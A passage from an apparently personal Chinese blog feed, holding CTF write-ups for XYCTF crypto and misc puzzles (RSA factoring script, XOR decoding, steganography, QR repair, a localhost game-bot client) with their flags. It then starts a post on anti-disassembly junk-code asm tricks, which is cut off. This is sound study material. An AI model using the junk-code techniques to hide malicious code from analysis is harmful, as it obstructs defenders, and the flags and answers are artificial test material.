class="number">697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501</span></span><br><span class="line"></span><br><span class="line">p_values = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>]</span><br><span class="line">q_values = [<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>]</span><br><span class="line"></span><br><span class="line">n_str = <span class="built_in">str</span>(n)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">q = <span class="string">&#x27;&#x27;</span></span><br><span class="line">upone = <span class="number">0</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">p, i, digit</span>):</span><br><span class="line">    p_list = <span class="built_in">list</span>(p)</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(p_list):</span><br><span class="line">        p_list[<span class="number">0</span>] = digit</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p_list.insert(<span class="number">0</span>,digit)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(p_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p_q</span>(<span class="params">i, p, q</span>):</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span>)<span class="keyword">or</span>(<span class="built_in">int</span>(p)*<span class="built_in">int</span>(q)==n):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;p:&#x27;</span>, <span class="built_in">int</span>(p))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;q:&#x27;</span>, <span class="built_in">int</span>(q))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    j = <span class="built_in">len</span>(n_str) -<span class="number">1</span> -i</span><br><span class="line">    <span class="keyword">for</span> p_val <span class="keyword">in</span> p_values:</span><br><span class="line">        new_p = <span class="built_in">set</span>(p, j, p_val)</span><br><span class="line">        <span class="keyword">for</span> q_val <span class="keyword">in</span> q_values:</span><br><span class="line">            new_q = <span class="built_in">set</span>(q, j, q_val)</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">str</span>(<span class="built_in">int</span>(new_q)*<span class="built_in">int</span>(new_p))[-(<span class="number">1</span>+j)]) == n_str[i]:</span><br><span class="line">                <span class="keyword">if</span> find_p_q(i-<span class="number">1</span>, new_p, new_q): <span class="comment"># 向下一层</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span> <span class="comment"># 否则向上一层</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> find_p_q(<span class="built_in">len</span>(n_str)-<span class="number">1</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wrong&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">12121111312111223223122131311333233122132311113333112131132223222322113121112211311111122233111221112223111221331112322222333332331231122322123321123123133323213331321113332333332231113221231213322231322132311333132111221123111323112322131123322323331121233332123131222321123312221122323311122131121132332322222321213223131211322122311113331331222212121313131121212322112122212323321311231113213233312223111132133321123211122222213321223332322123131333322121223233122311222211311133331123122122331232313131221113</span></span><br><span class="line">q = <span class="number">57577765666565565655657656576766776756666756575575655557577765666657666756565556567577677665557556655765767767655556677756576555657667566766667676566655656776775755756775755667657675665677575667656666776656677656575665766556767757667556655755567556776556675656666757767667757657665757566667776555777667667675756767666767666557555757566576666656676677575575577567765566577557756566766557765676756756557667655756575677676567766776665777656776577676577576757576665777555555575575656555655657776566765775556575765677</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p*q==n)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">12121111312111223223122131311333233122132311113333112131132223222322113121112211311111122233111221112223111221331112322222333332331231122322123321123123133323213331321113332333332231113221231213322231322132311333132111221123111323112322131123322323331121233332123131222321123312221122323311122131121132332322222321213223131211322122311113331331222212121313131121212322112122212323321311231113213233312223111132133321123211122222213321223332322123131333322121223233122311222211311133331123122122331232313131221113</span></span><br><span class="line">q = <span class="number">57577765666565565655657656576766776756666756575575655557577765666657666756565556567577677665557556655765767767655556677756576555657667566766667676566655656776775755756775755667657675665677575667656666776656677656575665766556767757667556655755567556776556675656666757767667757657665757566667776555777667667675756767666767666557555757566576666656676677575575577567765566577557756566766557765676756756557667655756575677676567766776665777656776577676577576757576665777555555575575656555655657776566765775556575765677</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">153383826085102296581238539677668696644156148059026868813759015106139131297135097831661048493079405226972222492151356105759235749502324303047037349410709021152255315429280760639113724345836532087970918453353723090554450581657930847674930226113840172368662838756446364482977092478979838209396761279326533419699056209983721842484996150025403009644653678928025861445324715419893797015875541525590135843027312322236085581571452084477262582966972702577136904385741443870527205640874446616413917231260133364227248928492574610248881137364204914001412269740461851747883355414968499272944590071623223603501698004227753335552646715567802825755799597955409228004284739743749531270833084850113574712041224896044525292591264637452797151098802604186311724597450780520140413704697374209653369969451501627583467893160412780732575085846467289134920886789952338174193202234175299652687560232593212131693456966318670843605238958724126368185289703563591477049105538528244632434869965333722691837462591128379816582723367039674028619947057144546</span></span><br><span class="line"></span><br><span class="line">Srsa(p,q,e,c)<span class="comment"># 自己写的解密函数</span></span><br><span class="line"><span class="comment"># b&#x27;XYCTF&#123;7f4b2241951976ce5ef6df44503209059997e5085d1bc21f6bef4d9effb29fd0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="MISC">MISC</h2><h3 id="week1-3">week1</h3><h4 id="TCPL">TCPL</h4><p>拖入ida分析，，发现只是异或了i，得到没有替换的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b = [<span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x7F</span>, <span class="number">0x55</span>, <span class="number">0x4A</span>, <span class="number">0x44</span>, <span class="number">0x5C</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x65</span>, <span class="number">0x38</span>, <span class="number">0x52</span>, <span class="number">0x7C</span>, <span class="number">0x3E</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x64</span>, <span class="number">0x4C</span>, <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x7E</span>, <span class="number">0x62</span>, <span class="number">0x79</span>, <span class="number">0x77</span>, <span class="number">0x74</span>, <span class="number">0x2A</span>, <span class="number">0x61</span>]</span><br><span class="line">pxor(b)</span><br><span class="line"><span class="comment"># FLAG&#123;PLCT_An4_r1SCv_x1huann1&#125;</span></span><br></pre></td></tr></table></figure><p>把1换成其它值，多试一下</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;PLCT_A<span class="symbol">n4</span>_r<span class="number">0</span>SCv_x<span class="number">0</span>hua<span class="symbol">nn0</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="ez-隐写">ez_隐写</h4><p>开头一个伪加密，改好了之后有一个hint.png和一个watermark.jpg的文件,但是water.jpg要解压,修改hint.png的长宽获得密码xyctf0401，然后解压watermark.jpg，用盲水印工具打开可得flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XYCTF</span>&#123;<span class="number">758</span>-W5X-IJN-<span class="number">852</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="修仙传">修仙传</h4><h5 id="4元婴">4元婴</h5><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">都<span class="number">2024</span>年了不会还有人解不出U<span class="number">2</span>FsdGVkX<span class="number">1</span>+y<span class="number">2</span>rlJZlJCM<span class="symbol">nvyDwHwzkgHvNsG2</span>TF<span class="number">6</span>sFlBlxBs<span class="number">0</span>w<span class="number">4</span>EmyXdDe<span class="number">6</span>s<span class="number">7</span>viL吧</span><br></pre></td></tr></table></figure><p>key: 2024 TripleDes解密得密码</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The<span class="number">_f</span>ourth<span class="number">_f</span>loor<span class="number">_</span><span class="keyword">is</span><span class="number">_</span>okay</span><br></pre></td></tr></table></figure><p>打开文件得到一个微信数据库文件和一个</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wqk：<span class="number">1</span><span class="name">m813</span>o<span class="symbol">nn17</span><span class="meta">o040358</span>p<span class="number">772</span>q<span class="number">37</span>r<span class="name">m137</span>qp<span class="symbol">nqppqpn38</span><span class="symbol">nr704</span><span class="name">m56</span><span class="symbol">n2</span><span class="name">m9</span>q<span class="number">22</span>p<span class="meta">o7</span>r<span class="number">05</span>r<span class="number">77</span></span><br></pre></td></tr></table></figure><p>修改其中的字符</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1A813CBB17C040358D772E37FA137EDBEDDEDB38BF704A56B2A9E22DC7F05F77</span><br></pre></td></tr></table></figure><p>直接用脚本解密aes即可</p><p><img src="https://s2.loli.net/2024/04/09/O4jcnmRQfHrpzWU.png" alt="image-20240409192304734"></p><h5 id="7合体">7合体</h5><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密文：Tig+AF8-viakubq+AF8-vphrz+AF8-xi+AF8-uayzdyrjs</span><br><span class="line"></span><br><span class="line">听说维吉尼亚<span class="built_in">key</span>大残</span><br></pre></td></tr></table></figure><p>放到维吉尼亚解密里面，AF8指密钥和密文长度一样</p><p>假设密钥是ABCDEFGHIJKLMNOPQRST</p><p>得到密码</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The<span class="number">_</span>seventh<span class="number">_</span>level<span class="number">_</span><span class="keyword">is</span><span class="number">_</span>difficult</span><br></pre></td></tr></table></figure><p>得到一张颜色图片，8进制转换即可</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">they_were_thr0ugh!</span><br></pre></td></tr></table></figure><h5 id="8大乘">8大乘</h5><p>开头是密码，直接用网上的异或加合脚本爆出来pq</p><p>然后rsa求密码</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pruning_algorithm</span></span><br></pre></td></tr></table></figure><p>出来是一个yesno文件</p><p>根据压缩包的提示把yes改成1，no改成0生成图片</p><p>内容是原神的文字，转换</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S<span class="name">m3</span>rt_y<span class="number">0</span>u_ca<span class="symbol">n_do</span></span><br></pre></td></tr></table></figure><h3 id="week3-2">week3</h3><h4 id="我的二维码为啥扫不出来？">我的二维码为啥扫不出来？</h4><p>根据定位点和时序图案还原</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line">import <span class="built_in">random</span></span><br><span class="line"></span><br><span class="line">def reverse_color(x):</span><br><span class="line">    <span class="built_in">return</span> <span class="number">0</span> <span class="keyword">if</span> x == <span class="number">255</span> <span class="keyword">else</span> <span class="number">255</span></span><br><span class="line"></span><br><span class="line">def reverse_row_colors(pixels, <span class="built_in">row</span>, <span class="built_in">width</span>, block_size=<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> x_block <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">width</span> // block_size):</span><br><span class="line">        x = x_block * block_size</span><br><span class="line">        y = <span class="built_in">row</span> * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line">def reverse_col_colors(pixels, <span class="built_in">col</span>, <span class="built_in">height</span>, block_size=<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> y_block <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">height</span> // block_size):</span><br><span class="line">        x = <span class="built_in">col</span> * block_size</span><br><span class="line">        y = y_block * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line">encrypted_img = Image.open(<span class="string">&quot;new.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">decrypted_img = encrypted_img.<span class="built_in">copy</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">width</span>, <span class="built_in">height</span> = decrypted_img.size</span><br><span class="line">pixels = decrypted_img.<span class="built_in">load</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse_row_colors(pixels, <span class="number">1</span>, <span class="built_in">width</span>)</span><br><span class="line">reverse_row_colors(pixels, <span class="number">12</span>, <span class="built_in">width</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse_col_colors(pixels, <span class="number">2</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">0</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">5</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">10</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">11</span>, <span class="built_in">height</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decrypted_img.<span class="built_in">save</span>(<span class="string">&quot;decrypted.png&quot;</span>)</span><br><span class="line"># flag&#123;qR_c0d3_1s_s0_fun&#125;</span><br></pre></td></tr></table></figure><h4 id="Rosk-Paper-Scissors">Rosk,Paper,Scissors!</h4><p>根据看ai的逻辑，发现是检索我出的最多的那个来判断这一次出什么，那就反制这个，写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">alist = [] </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_most_count</span>(<span class="params">alist</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = Counter(alist)</span><br><span class="line">        <span class="keyword">return</span> data.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = Counter(alist)</span><br><span class="line">            <span class="keyword">return</span> data.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Scissors&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> ==<span class="string">&#x27;Rock&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Paper&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> ==<span class="string">&#x27;Paper&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Scissors&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> == <span class="string">&#x27;Scissors&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Rock&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Rock&#x27;</span></span><br><span class="line"><span class="comment"># 创建一个socket对象</span></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到服务器</span></span><br><span class="line">client_socket.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">2137</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化上一次的选择为None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取并打印服务器的欢迎消息</span></span><br><span class="line">data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;接收到的数据: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 游戏循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    this_choice = back(get_most_count(alist))</span><br><span class="line">    <span class="comment"># 发送选择</span></span><br><span class="line">    client_socket.send((this_choice + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">    <span class="built_in">print</span>(this_choice)</span><br><span class="line">    <span class="comment"># 等待一段时间以便服务器处理我们的输入</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取并打印服务器的响应</span></span><br><span class="line">    data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;接收到的数据: <span class="subst">&#123;data&#125;</span>&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据游戏的结果来更新上一次的选择或结束游戏</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;win&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        alist.append(this_choice)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        client_socket.close()</span><br><span class="line">        <span class="keyword">break</span>  <span class="comment"># 结束游戏循环</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭连接</span></span><br><span class="line">client_socket.close()</span><br><span class="line"><span class="comment"># XYCTF&#123;6e6e643f-8bf5-4d67-a0d7-be3a6d7cbedc&#125;</span></span><br><span class="line"><span class="comment"># 记不得了，大概是这个flag</span></span><br></pre></td></tr></table></figure><h4 id="美妙的歌声">美妙的歌声</h4><p>用audacity打开，以频谱图模式观察，发现字符串：XYCTF_1s_w3ll</p><p>这个看起来不是flag，但是可能是其它东西，用deepsound打开，把这个当密码，得到flag.txt</p><p>内容是</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XYCTF&#123;T0uch_y0ur_he3rt_d55ply!!&#125;</span><br></pre></td></tr></table></figure><hr><p>总结：</p><p>re部分还是比较简单，基本没有什么问题<br>大部分是基础内容，没有ollvm和复杂的花也没有强的壳，<br>就直接分析逻辑或者动调就可以解，re还是偏简单的</p><p>类型：</p><p>两道flag不是输入的题：龙芯和白月光</p><p>其它都是直接逆向的题：</p><p>自定义逻辑</p><p>asm</p><p>伪vm</p><p>…</p><p>baby unity里面的工具在使用后会直接还原csharp方法名，在dumpdll文件夹中</p><p>cry部分会不了一点，不过密码✌要带我，太好了<br>之后问一下rsa的部分，还有复数域的内容</p><p>misc部分还是做的少了，要多练，不然好多没见过的<br>这次学到了音频，二维码和水印<br>以及总结一下nc题的做法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">2137</span>))</span><br><span class="line"><span class="comment"># 连接的方式</span></span><br><span class="line"></span><br><span class="line">data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line"><span class="comment"># 接受数据的方式</span></span><br><span class="line"></span><br><span class="line">client_socket.send((<span class="string">&quot;xxx&quot;</span>).encode())</span><br><span class="line"><span class="comment"># 上传的方式</span></span><br><span class="line"></span><br><span class="line">client_socket.close()</span><br><span class="line"><span class="comment"># 关闭的方式</span></span><br></pre></td></tr></table></figure><p>通过这个方法上传和解析服务器的数据并提交内容</p>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>花指令研究</title>
      <link href="/posts/9ffaa92b.html"/>
      <url>/posts/9ffaa92b.html</url>
      
        <content type="html"><![CDATA[<p>那天，我遇到了destination那道题，然后遇到了seh和花指令。<br>然后，我苦思冥想，还是不会，遂问出题人，出题人曰：菜就多练。于是本篇博客就出现了。</p><p>参考：[<a href="https://bbs.kanxue.com/thread-279604.htm#msg_header_h2_10">原创][花指令]由易到难全面解析CTF中的花指令-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><h2 id="前言">前言</h2><p>先了解一下花指令：</p><p>花指令是专门针对静态分析的。且不在意逆向工程师可不可以看出来，关键在于让工程师逆不出来。对于动态调试，就要看情况了，有的可以直接出来，有的又搞不出来。</p><hr><p>反编译器的编译方法：</p><p>递归下降+线性扫描：</p><ul><li>从入口开始依次解析指令+遇到分支指令会递归进入分支进行反编译</li></ul><p>错误原理：</p><ul><li>机器码长度不固定，插入一个有指令作用的数据会导致其被解析成指令随后的n个字节会被解释为操作数，这样之后的内容就无法反编译了</li></ul><hr><p>花指令分为两种：</p><p>被执行的花指令和不被执行的花指令</p><p>不被执行的花指令如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__asm&#123;</span><br><span class="line">jmp Label1</span><br><span class="line">db junkcode</span><br><span class="line">Label1:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种jmp的可以直接nop掉（不过这个会被直接识别出来）</p><p>可以这样：</p><p>jmp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">asm</span><br><span class="line">&#123;</span><br><span class="line">  Jz Label</span><br><span class="line">  Jnz Label</span><br><span class="line">  Db thunkcode;垃圾数据</span><br><span class="line">Label:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>永恒跳转，但是ida无法识别</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm&#123;</span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">ebx</span>,<span class="built_in">ebx</span></span><br><span class="line">    <span class="keyword">test</span> <span class="built_in">ebx</span>,<span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">    jnz label</span>1</span><br><span class="line"><span class="symbol">    jz label</span>2</span><br><span class="line"><span class="symbol">label1:</span></span><br><span class="line">    _emit junkcode</span><br><span class="line"><span class="symbol">label2:</span></span><br><span class="line">   <span class="keyword">pop</span> <span class="built_in">ebx</span>//需要恢复<span class="built_in">ebx</span>寄存器   </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">__asm&#123;</span><br><span class="line">    <span class="keyword">clc</span></span><br><span class="line"><span class="symbol">    jnz label</span>1:</span><br><span class="line">    _emit junkcode</span><br><span class="line"><span class="symbol">label1:</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同永恒跳转，不过使用test强制转换标志位</p><p>call&amp;ret:</p><blockquote><p>call指令的本质：push eip，然后jmp 函数地址</p><p>ret指令的本质：pop eip</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span 